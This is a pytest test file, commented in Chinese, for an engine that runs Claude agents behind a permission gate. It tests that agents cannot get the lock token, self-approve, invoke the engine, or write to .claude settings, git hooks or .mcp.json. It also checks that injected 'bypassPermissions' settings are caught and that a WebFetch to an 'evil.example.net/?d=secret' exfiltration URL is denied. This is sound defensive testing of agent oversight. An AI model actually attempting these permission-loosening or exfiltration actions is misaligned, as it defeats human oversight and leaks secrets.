"""code-reviewer 複審（fcb0613）退回項目的回歸測試：鎖 token 不外流、工作目錄控制檔保護、
stdin 不阻塞逾時，以及 A1～A9。"""

import copy
import json
import os
import subprocess
import sys
import time

import pytest

from conftest import ENGINE_DIR, PY, REPO_DIR, demo_config, write_project
from lhf import claude_call, gate, hours, lock, proc
from lhf import round as round_mod
from lhf.config import load_config
from lhf.errors import ConfigError, RoundError
from lhf.state import append_jsonl, commands_path, load_state


def project_with(tmp_path, mutate, name="demo"):
    data = copy.deepcopy(demo_config())
    mutate(data)
    return write_project(tmp_path, data, name)


def cli(args, env, timeout=120):
    return subprocess.run(
        [sys.executable, "-m", "lhf", *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=env,
        cwd=ENGINE_DIR,
        check=False,
        timeout=timeout,
        stdin=subprocess.DEVNULL,
    )


def ctx(role, unit="a"):
    return {"role": role, "unit": unit, "round": "1", "station": "", "session": "s", "trace_offset": 0}


# ---------- MUST 1：鎖 token 不外流 ----------


def test_agent_and_command_env_have_no_lock_token(demo_dir, monkeypatch):
    monkeypatch.setenv(lock.TOKEN_ENV, "secret-token")
    monkeypatch.setenv("LH_FAKE_VERDICT", "FAIL_ONCE")
    monkeypatch.setenv("LH_ALLOW_PROJECT_PERMISSIONS", "1")
    cfg = load_config(demo_dir)
    rt = {"cfg": cfg, "state": {}, "unit": "a", "round": 2}
    agent = claude_call.build_env(cfg, rt, role="maker", station_id="make")
    command = claude_call.command_env(cfg, rt)
    assert lock.TOKEN_ENV not in agent and lock.TOKEN_ENV not in command
    assert not [k for k in command if k.startswith("LH_")]  # 指令站：一個 LH_* 都沒有
    gate_keys = {"LH_PROJECT_DIR", "LH_UNIT", "LH_ROUND", "LH_ROLE", "LH_STATION", "LH_TRACE_OFFSET"}
    assert {k for k in agent if k.startswith("LH_")} == gate_keys  # 代理：只給 gate 需要的


def test_approve_from_engine_env_is_refused(tmp_path, monkeypatch):
    """代理或撰寫者腳本自己跑 approve：拿不到鎖，而且引擎環境旗標會直接拒絕（不會排進佇列）。"""
    project = project_with(
        tmp_path, lambda d: d["stations"].insert(4, {"id": "pub", "kind": "approve", "chain": "finish"})
    )
    cfg = load_config(project)
    monkeypatch.setenv("LH_FAKE_MODEL", "1")
    round_mod.cmd_init(cfg, ["a"], False)
    round_mod.cmd_run(cfg)  # a 停在 pub 等核准
    holder = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"])
    try:
        lock.lock_path(cfg).write_text(
            json.dumps(
                {
                    "pid": holder.pid,
                    "started": lock.process_start_time(holder.pid),
                    "token": "secret-token",
                    "purpose": "hours",
                }
            ),
            encoding="utf-8",
        )
        monkeypatch.setenv(lock.TOKEN_ENV, "secret-token")  # hours 自己的環境裡有 token
        env = claude_call.command_env(cfg, {"cfg": cfg, "state": {}, "unit": "a", "round": 1})
        env["PYTHONPATH"] = str(ENGINE_DIR)
        result = cli([str(project), "approve", "a"], env)
        assert result.returncode == 5 and "引擎底下的程序不可下人工指令" in result.stderr
        assert load_state(cfg)["units"]["a"]["status"] == "pending_approval"  # state 沒被改
        assert not commands_path(cfg).exists()  # 也沒排進佇列
    finally:
        holder.kill()


def test_hours_does_not_put_token_in_os_environ(demo_dir, monkeypatch):
    monkeypatch.setenv("LH_FAKE_MODEL", "1")
    cfg = load_config(demo_dir)
    round_mod.cmd_init(cfg, ["a"], False)
    seen = {}

    def fake_run_hours(cfg_, args, token):
        seen["token"] = token
        seen["environ"] = os.environ.get(lock.TOKEN_ENV)
        seen["child"] = hours.child_env(token).get(lock.TOKEN_ENV)
        return 0

    monkeypatch.setattr(hours, "run_hours", fake_run_hours)
    hours.cmd_hours(cfg, None)
    assert seen["token"] and seen["environ"] is None and seen["child"] == seen["token"]


# ---------- MUST 2：工作目錄控制檔 ----------


@pytest.fixture
def wide_writer(tmp_path, monkeypatch):
    work = tmp_path / "work"
    (work / "sub").mkdir(parents=True)
    monkeypatch.setenv("LH_WORK_OVERRIDE", str(work))

    def mutate(data):
        data["roles"]["maker"]["write"] = ["{WORK}/**"]
        data["agent_cwd"] = "{WORK}/sub"

    return load_config(project_with(tmp_path, mutate)), work


@pytest.mark.parametrize(
    "rel",
    [
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".git/hooks/pre-commit",
        ".mcp.json",
        ".CLAUDE/Settings.json",
        ".git\\config",
        "sub/.claude/settings.json",
        "sub/.mcp.json",
        "x/../.git/HEAD",
    ],
)
def test_gate_denies_work_control_files(wide_writer, rel):
    cfg, work = wide_writer
    event = {"tool_name": "Write", "tool_input": {"file_path": str(work) + "/" + rel}, "cwd": str(work)}
    decision, reason, _ = gate.decide(event, cfg, ctx("maker"))
    assert decision == "deny" and "引擎內部檔" in reason


def test_gate_allows_normal_file_under_wide_write(wide_writer):
    cfg, work = wide_writer
    event = {"tool_name": "Write", "tool_input": {"file_path": str(work / "a.txt")}}
    assert gate.decide(event, cfg, ctx("maker"))[0] == "allow"


@pytest.mark.parametrize(
    "pattern", ["{WORK}/.git/hooks/*", "{WORK}/.claude/settings.json", "{WORK}/.mcp.json", "{WORK}/.claude/**"]
)
def test_config_rejects_explicit_control_write(tmp_path, pattern):
    with pytest.raises(ConfigError, match="工作目錄控制檔"):
        load_config(project_with(tmp_path, lambda d: d["roles"]["maker"]["write"].append(pattern)))


def test_config_allows_wide_work_write(tmp_path):
    """{WORK}/** 這種寬寫法在 config 層放行（交給 gate 逐筆擋），否則「整個工作目錄都是產出」的專案寫不出設定。"""
    load_config(project_with(tmp_path, lambda d: d["roles"]["maker"].update(write=["{WORK}/**"])))


def test_project_permissions_checked_before_every_call(demo_dir, tmp_path, monkeypatch):
    work = tmp_path / "w"
    work.mkdir()
    monkeypatch.setenv("LH_WORK_OVERRIDE", str(work))
    monkeypatch.setattr(claude_call, "find_claude", lambda: ["claude"])
    cfg = load_config(demo_dir)
    rt = {"cfg": cfg, "state": {}, "unit": "a", "round": 1}
    claude_call.prepare_call(cfg, rt, "maker", "p", "make")  # 第一次：沒有放寬設定
    (work / ".claude").mkdir()
    (work / ".claude" / "settings.local.json").write_text(
        '{"permissions": {"defaultMode": "bypassPermissions"}}', encoding="utf-8"
    )
    with pytest.raises(RoundError, match="放寬了權限"):
        claude_call.prepare_call(cfg, rt, "maker", "p", "make")  # 中途被放進設定 → 下一次呼叫就擋


# ---------- MUST 3：stdin 不阻塞逾時 ----------


def test_run_tree_unread_big_stdin_still_times_out():
    start = time.monotonic()
    result = proc.run_tree(
        [sys.executable, "-c", "import time; time.sleep(20)"],
        cwd=".",
        env=os.environ.copy(),
        timeout=3,
        input_text="x" * 500_000,
    )
    assert result.timed_out and time.monotonic() - start < 8


def test_run_tree_stdin_is_delivered():
    script = "import sys; data = sys.stdin.buffer.read().decode('utf-8'); print(len(data), data[:2])"
    result = proc.run_tree(
        [sys.executable, "-c", script], cwd=".", env=os.environ.copy(), timeout=20, input_text="中文" * 100_000
    )
    assert result.stdout.split() == ["200000", "中文"] and not result.timed_out


@pytest.mark.skipif(os.name != "nt", reason="Job Object 只在 Windows")
def test_job_failure_warns_and_falls_back(monkeypatch, capsys):
    def broken(_handle):
        raise OSError("模擬失敗")

    monkeypatch.setattr(proc, "_create_job", broken)
    result = proc.run_tree([sys.executable, "-c", "print('ok')"], cwd=".", env=os.environ.copy(), timeout=20)
    assert result.stdout.strip() == "ok" and result.returncode == 0  # 子程序有被恢復執行
    assert "Job Object 無法使用" in capsys.readouterr().err


# ---------- A1：指令佇列不遺失、不重複 ----------


def approve_ready(tmp_path, monkeypatch):
    project = project_with(
        tmp_path, lambda d: d["stations"].insert(4, {"id": "pub", "kind": "approve", "chain": "finish"})
    )
    cfg = load_config(project)
    monkeypatch.setenv("LH_FAKE_MODEL", "1")
    round_mod.cmd_init(cfg, ["a", "b"], False)
    round_mod.cmd_run(cfg, "a")
    return cfg


def test_leftover_processing_file_is_recovered(tmp_path, monkeypatch):
    """上次在「認領之後、存檔之前」當機：殘留的 processing 檔下一輪會被讀回來套用，然後才刪除。"""
    cfg = approve_ready(tmp_path, monkeypatch)
    leftover = cfg.run_dir / "commands.processing-999-1.jsonl"
    append_jsonl(leftover, {"id": "x1", "command": "approve", "unit": "a", "ancestry_checked": True})
    state = load_state(cfg)
    round_mod.apply_queued({"cfg": cfg, "state": state, "unit": "b", "round": 2})
    assert load_state(cfg)["units"]["a"]["status"] == "in_progress" and not leftover.exists()


def test_duplicate_command_applied_once(tmp_path, monkeypatch):
    cfg = approve_ready(tmp_path, monkeypatch)
    record = {"id": "dup", "command": "reset-calls", "unit": "a", "ancestry_checked": True}
    append_jsonl(commands_path(cfg), record)
    append_jsonl(cfg.run_dir / "commands.processing-1-1.jsonl", record)
    state = load_state(cfg)
    round_mod.apply_queued({"cfg": cfg, "state": state, "unit": "b", "round": 2})
    events = [h["event"] for h in load_state(cfg)["history"] if "手動歸零" in h["event"]]
    assert len(events) == 1 and "dup" in load_state(cfg)["applied_commands"]


# ---------- A2：舊鎖清除的競態 ----------

RACER = """
import sys, time
sys.path.insert(0, sys.argv[1])
from lhf.config import load_config
from lhf import lock
cfg = load_config(sys.argv[2])
time.sleep(max(0, float(sys.argv[3]) - time.time()))
try:
    info, _ = lock.acquire(cfg, "race")
    print("WIN", flush=True)
    time.sleep(3)
    lock.release(cfg, info)
except lock.LockBusy:
    print("BUSY", flush=True)
except Exception as exc:  # 任何其他例外都算失敗（Windows 刪除中的檔案曾丟 PermissionError）
    print("ERR", repr(exc), flush=True)
"""


def test_stale_lock_race_has_single_winner(demo_dir, tmp_path):
    cfg = load_config(demo_dir)
    lock.lock_path(cfg).parent.mkdir(parents=True, exist_ok=True)
    lock.lock_path(cfg).write_text(json.dumps({"pid": 999999, "started": 1, "token": "old"}), encoding="utf-8")
    script = tmp_path / "racer.py"
    script.write_text(RACER, encoding="utf-8")
    start_at = str(time.time() + 2)
    racers = [
        subprocess.Popen(
            [sys.executable, str(script), str(ENGINE_DIR), str(demo_dir), start_at],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            stdin=subprocess.DEVNULL,
        )
        for _ in range(8)
    ]
    outputs = [r.communicate(timeout=60)[0] for r in racers]
    assert sum("WIN" in out for out in outputs) == 1, outputs
    assert sum("BUSY" in out for out in outputs) == 7 and not any("ERR" in out for out in outputs), outputs


def test_lock_file_never_half_written(demo_dir):
    """os.link 建鎖：鎖檔一出現就是完整內容（不會被別人讀到空檔而誤判成舊鎖）。"""
    cfg = load_config(demo_dir)
    info, created = lock.acquire(cfg, "t")
    try:
        assert created and lock.read_lock(cfg) == info
    finally:
        lock.release(cfg, info)


# ---------- A4／A5／A6／A7 ----------


def deploy_station(**extra):
    return {
        "id": "deploy",
        "kind": "command",
        "chain": "finish",
        "log": "{RUN}/deploy.log",
        "cmds": [{"cmd": "echo"}],
        **extra,
    }


def test_finish_command_needs_approve(tmp_path):
    with pytest.raises(ConfigError, match="前面必須有 approve 站"):
        load_config(project_with(tmp_path, lambda d: d["stations"].append(deploy_station())))


def test_finish_command_after_approve_ok(tmp_path):
    def mutate(data):
        data["stations"].append({"id": "ok", "kind": "approve", "chain": "finish"})
        data["stations"].append(deploy_station())

    load_config(project_with(tmp_path, mutate))


def test_unattended_only_on_finish(tmp_path):
    with pytest.raises(ConfigError, match="unattended"):
        load_config(project_with(tmp_path, lambda d: d["stations"][1].update(unattended=True)))


def test_checker_cannot_write_command_log(tmp_path):
    def mutate(data):
        data["files"]["raw"] = "{RUN}/qa/{unit}-raw.log"  # raw log 跑進 QA 可寫的資料夾

    with pytest.raises(ConfigError, match="raw log"):
        load_config(project_with(tmp_path, mutate))


def test_k143_tester_write_is_only_its_report(k143_dir):
    cfg = load_config(k143_dir)
    assert cfg.roles["tester"]["write"] == ["{testlog}"]


@pytest.mark.parametrize(
    "allow, fragment",
    [(None, "必須設 fetch_allow"), ([".*"], "錨定"), (["^https?://"], "邊界"), (["^https://"], "邊界")],
)
def test_webfetch_requires_fetch_allow(tmp_path, allow, fragment):
    def mutate(data):
        data["roles"]["maker"]["tools"].append("WebFetch")
        if allow is not None:
            data["roles"]["maker"]["fetch_allow"] = allow

    with pytest.raises(ConfigError, match=fragment):
        load_config(project_with(tmp_path, mutate))


def test_fetch_allow_without_webfetch_rejected(tmp_path):
    with pytest.raises(ConfigError, match="沒有 WebFetch"):
        load_config(project_with(tmp_path, lambda d: d["roles"]["maker"].update(fetch_allow=["^https://a[.]b/"])))


def test_gate_checks_webfetch_url(tmp_path, monkeypatch):
    monkeypatch.setenv("LH_WORK_OVERRIDE", str(tmp_path / "w"))

    def mutate(data):
        data["roles"]["maker"]["tools"].append("WebFetch")
        data["roles"]["maker"]["fetch_allow"] = ["^https://docs[.]example[.]com/"]

    cfg = load_config(project_with(tmp_path, mutate))
    ok = {"tool_name": "WebFetch", "tool_input": {"url": "https://docs.example.com/a", "prompt": "x"}}
    bad = {"tool_name": "WebFetch", "tool_input": {"url": "https://evil.example.net/?d=secret", "prompt": "x"}}
    assert gate.decide(ok, cfg, ctx("maker"))[0] == "allow"
    assert gate.decide(bad, cfg, ctx("maker"))[1].startswith("maker 的 fetch_allow")
    assert gate.decide({"tool_name": "WebFetch", "tool_input": {}}, cfg, ctx("maker"))[1] == "WebFetch 缺少 url"


@pytest.mark.parametrize(
    "command",
    [
        "python -m lhf ../proj approve a",
        "python -m  LHF.gate",
        f"python {ENGINE_DIR.as_posix()}/lhf/round.py",
        "python engine\\lhf\\gate.py",
    ],
)
def test_gate_denies_engine_self_invocation(tmp_path, monkeypatch, command):
    monkeypatch.setenv("LH_WORK_OVERRIDE", str(tmp_path / "w"))
    cfg = load_config(project_with(tmp_path, lambda d: d["roles"]["maker"]["bash_allow"].append("^python ")))
    decision, reason, _ = gate.decide({"tool_name": "Bash", "tool_input": {"command": command}}, cfg, ctx("maker"))
    assert decision == "deny" and "不可在代理中呼叫引擎" in reason


# ---------- A8／A9 ----------


def test_gitignore_policy():
    text = (REPO_DIR / ".gitignore").read_text(encoding="utf-8")
    for line in (
        "projects/*/run/.runtime/",
        "projects/*/run/heartbeat.txt",
        "projects/*/run/commands*.jsonl",
        "projects/*/run/logs/agent-fail-*",
    ):
        assert line in text.splitlines()
    assert "projects/*/run/logs/" not in text.splitlines()  # hours 摘要要能跨電腦看，logs 不整個忽略


def test_child_interrupt_is_logged(demo_dir, monkeypatch, tmp_path):
    cfg = load_config(demo_dir)
    log = (tmp_path / "h.log").open("w", encoding="utf-8")
    ctx_ = {"cfg": cfg, "log": log, "rounds": [], "alert_lines": [], "token": "t"}
    monkeypatch.setattr(proc, "stream_tree", lambda *a, **k: (130, "ok"))
    try:
        assert hours.stream_round(ctx_) == (130, "ok")
    finally:
        log.close()
    assert "子程序被中斷（exit 130），hours 未收到中斷" in (tmp_path / "h.log").read_text(encoding="utf-8")


def test_engine_error_exit_130_counts_as_engine_error():
    assert 130 not in hours.QUALITY_EXITS and PY
